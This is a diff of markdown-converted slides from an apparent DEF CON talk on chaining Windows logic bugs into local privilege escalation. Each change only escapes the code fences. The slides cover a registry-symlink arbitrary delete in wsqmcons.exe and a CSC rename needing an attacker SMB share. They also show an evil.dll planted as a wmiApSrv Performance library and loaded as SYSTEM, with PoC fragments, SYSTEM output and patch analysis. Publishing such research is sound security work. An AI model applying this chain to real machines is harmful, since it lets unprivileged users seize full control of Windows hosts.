 **`[1] AU GRGX`** The DACL grants Authenticated Users Generic Read/Execute — any logged-on user can run the task. **`[2] S-1-5-18`** NT AUTHORITY\SYSTEM — the task always executes as SYSTEM.
 
@@ -1710,13 +1715,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 - `10 </Principals> 11 <Actions Context="WinSQMAccount">` **`=>`** A SYSTEM-principal task `12 <Exec><Command>%SystemRoot%\System32\wsqmcons.exe</Command></Exec>` whose ACL explicitly lets normal `13 </Actions>` users launch it. No admin, no UAC.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 56
-```
+\```
 
 ## Slide 57
 
@@ -1732,13 +1737,13 @@ Schedule
 wsqmcons.exe ◄ runs  Unregister
 SYSTEM PathForCommonUpload()
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 57
-```
+\```
 
 ## Slide 58
 
@@ -1767,13 +1772,13 @@ REG_OPTION_OPEN_LINK — so if Paths is a symlink, the open FOLLOWS it.
 
 - **`[3]`** SHDeleteKeyW recursively deletes the opened key and every subkey — as SYSTEM. That’s the primitive.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 58
-```
+\```
 
 ## Slide 59
 
@@ -1783,21 +1788,21 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **ANY target key** that we want gone
 
-```
+\```
 symlink
-```
+\```
 
 `ws` `q` `mcons.exe` `(` `SYSTEM` `)` `RegOpenKeyExW(..., 0x20106, ...)   // no OPEN_LINK → follows link SHDeleteKeyW(hKey, ...)            // deletes <ANY TARGET KEY>` ⇒ **`Arbitrary Registry Key Deletion  (as SYSTEM)`**
 
 A confused deputy: **we control the pointer, SYSTEM does the deleting.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 59
-```
+\```
 
 ## Slide 60
 
@@ -1818,19 +1823,19 @@ CVE-2025-59512 → target service key an owned key, anywhere
 
 **DELETE RebootRename REG_LINK symlink CREATE target 4 5 6** CVE-2025-59512 → target service key an owned key, anywhere We must delete RebootRename before we can turn it into a symlink. **Delete → create → delete → link → create. Zero memory corruption.**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 60
-```
+\```
 
 ## Slide 61
 
-```
+\```
 C:\> net use  \\<ip>\TestShare
-```
+\```
 
 ###### **One precondition: an SMB share you control**
 
@@ -1842,13 +1847,13 @@ _CSC only acts on a rename of a network file — so the chain needs a UNC path._
 
 No SMB share you control → no chain. Free on a LAN; a real hurdle when it’s locked down.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 61
-```
+\```
 
 ## Slide 62
 
@@ -1868,19 +1873,19 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 REG_OPTION_OPEN_LINK opens the symlink NODE itself; [3] NtDeleteKey deletes that node — clearing the stale link instead of following it. **`irony`** Here we deliberately use the exact flag whose ABSENCE in wsqmcons.exe created CVE-2025-59512.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 62
-```
+\```
 
 ## Slide 63
 
-```
+\```
 C:\> ida> main()  —the create/delete/link core
-```
+\```
 
 ###### **PoC — delete, create, plant the link**
 
@@ -1896,19 +1901,19 @@ C:\> ida> main()  —the create/delete/link core
 
 **`[6]`** Fire 60705 again: CSC “creates” RebootRename, follows our link, creates Pwn owned by us.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 63
-```
+\```
 
 ## Slide 64
 
-```
+\```
 C:\> so... now what?
-```
+\```
 
 **We own a key — how does that become SYSTEM?** _An arbitrary registry key we control isn’t power — yet._
 
@@ -1916,39 +1921,39 @@ C:\> so... now what?
 
 We need a **SYSTEM service that blindly trusts a registry key we can create** .  That’s exactly what a **Performance DLL** is.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 64
-```
+\```
 
 ## Slide 65
 
-```
+\```
 C:\> reg query  ...\Services\<svc>\Performance
-```
+\```
 
 ###### **We own a key — but that isn’t SYSTEM yet**
 
 _The dance gave us an arbitrary registry key we own. A key isn’t code exec — except this one (h/t itm4n)._
 
-```
+\```
 HKLM\...\Services\<svc>\Performance
-```
+\```
 
-```
+\```
 Library = C:\...\evil.dll
 Open    = OpenPerformanceData
 Collect = CollectPerformanceData
 Close   = ClosePerformanceData
-```
+\```
 
-```
+\```
 a SYSTEM perf collector reads these
 and LoadLibrary()s Libraryin-process
-```
+\```
 
 - **›** Point our owned key at a service’s **Performance** subkey
 
@@ -1956,23 +1961,23 @@ and LoadLibrary()s Libraryin-process
 
 - **› Open/Collect/Close** : exports the collector calls — any one runs our code. **›** So the registry key **becomes SYSTEM code exec**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 65
-```
+\```
 
 ## Slide 66
 
-```
+\```
 C:\> ida> exploit main()  —pivot the link
-```
+\```
 
 ###### **Retarget the chain at wmiApSrv\Performance**
 
-```
+\```
 exploit  —main()
 1intmain(){
 2...
@@ -1985,7 +1990,7 @@ exploit  —main()
 9
 10exploit();// [4]
 11}
-```
+\```
 
 **`[1]`** Only ONE value changes between harmless PoC and SYSTEM shell: the symlink target.
 
@@ -1993,13 +1998,13 @@ exploit  —main()
 
 **`[3][4]`** Fire 60705 → we now OWN wmiApSrv\Performance → hand off to exploit().
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 66
-```
+\```
 
 ## Slide 67
 
@@ -2027,13 +2032,13 @@ exploit.exe  — exploit()
 
 - **`[4]`** Get-WmiObject Win32_Perf forces the WMI Performance Adapter (SYSTEM) to load every registered perf Library — including ours.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 67
-```
+\```
 
 ## Slide 68
 
@@ -2051,23 +2056,23 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`[1][2][3]`** The export [1] runs system() directly; DllMain [2][3] does RevertToSelf → system() first. Either way it executes with the real SYSTEM token — the System32 write is proof.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 68
-```
+\```
 
 ## Slide 69
 
 **`C:\> type  C:\Windows\System32\cmdlog.txt` Payoff — nt authority\system**
 
-```
+\```
 C:\Windows\System32\cmdlog.txt
-```
+\```
 
-```
+\```
 USER INFORMATION
 User Name            SID
 nt authority\system  S-1-5-18
@@ -2076,35 +2081,35 @@ SeTcbPrivilege          Enabled
 SeDebugPrivilege        Enabled
 SeImpersonatePrivilege  Enabled
 SeLoadDriverPrivilege   Disabled
-```
+\```
 
 **›** Start: standard user, zero admin. **›** End: **SYSTEM** . **›** 100% logic, 0% memory corruption. **›** Win11 25H2 · 26200.6899
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 69
-```
+\```
 
 ## Slide 70
 
-```
+\```
 C:\> play  chain2_demo.mp4
-```
+\```
 
 ##### **Demo — Chain #2**
 
 standard user → DELETE + CREATE registry key → Performance DLL → **SYSTEM**
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 70
-```
+\```
 
 ## Slide 71
 
@@ -2112,13 +2117,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 _Three of the four were fixed. Here’s how each landed — and why you can’t just route around it._
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 71
-```
+\```
 
 ## Slide 72
 
@@ -2126,7 +2131,7 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 ###### **Patch 1 — Windows Search (CVE-2024-30033)**
 
-```
+\```
 patched  —CConnectionWaitList::Load()
 1bool__fastcallCConnectionWaitList::Load(...)
 2{
@@ -2139,7 +2144,7 @@ patched  —CConnectionWaitList::Load()
 9+}
 10...
 11}
-```
+\```
 
 **`WIL gate`** The whole SetUser/FileExists/DeleteFileW block is wrapped in a featureflag check.
 
@@ -2147,13 +2152,13 @@ patched  —CConnectionWaitList::Load()
 
 **`no sanitizer`** They didn’t add symlink validation — they just stopped calling the dangerous code.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 72
-```
+\```
 
 ## Slide 73
 
@@ -2178,13 +2183,13 @@ csc.sys  — CscRebootRenamepOpenKey()  patched
 
 **`not the flag`** They did NOT add OBJ_FORCE_ACCESS_CHECK (Attributes stays 0x240) — they fixed the ownership leak directly. **`structural`** This one is a real fix: the key is now SYSTEMowned regardless of impersonation.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 73
-```
+\```
 
 ## Slide 74
 
@@ -2202,13 +2207,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 **`same trick`** The same FeatureImpl mechanism as the WSearch patch. The dead code stays in the binary.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 74
-```
+\```
 
 ## Slide 75
 
@@ -2232,13 +2237,13 @@ SHDeleteKey never executes — the arbitrary-delete primitive is simply gone.
 
 2 of 3 fixes are **`FeatureImpl`** band-aids — dead code, not a sanitizer. Worth watching if a general fix ever re-enables the path.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 75
-```
+\```
 
 ## Slide 76
 
@@ -2250,13 +2255,13 @@ heegong@defcon:~$  chaining logical bugs for reliable windows LPE
 
 The pattern: **`“FeatureImpl”`** flags are Microsoft’s temporary Patch-Tuesday band-aids — worth watching for bypasses.
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 76
-```
+\```
 
 ## Slide 77
 
@@ -2294,13 +2299,13 @@ _Different components — the same recipe underneath._
 
 A weak primitive  +  something that makes it fire on demand  =
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 77
-```
+\```
 
 ## Slide 78
 
@@ -2320,19 +2325,19 @@ Kill, delete, create, redirect — partial control over privileged resources.
 
 _Go find partial control over a privileged resource. Then find a friend for it._
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 78
-```
+\```
 
 ## Slide 79
 
-```
+\```
 C:\> git shortlog -sne
-```
+\```
 
 ##### **Acknowledgements**
 
@@ -2354,13 +2359,13 @@ _Standing on the shoulders of researchers who share their tricks._
 
 _…and everyone who argues about bugs online._
 
-```
+\```
 heegong@defcon:~$  chaining logical bugs for reliable windows LPE
-```
+\```
 
-```
+\```
 79
-```
+\```
 
 ## Slide 80
 
@@ -2373,10 +2378,10 @@ C:\>  _
 
 ###### **HeeChan Kim** **`@heegong123`**
 
-```
+\```
 DEF CON 34 · Main Stage · slides + PoC notes on request
-```
+\```
 
-```
+\```
 80
-```
+\```
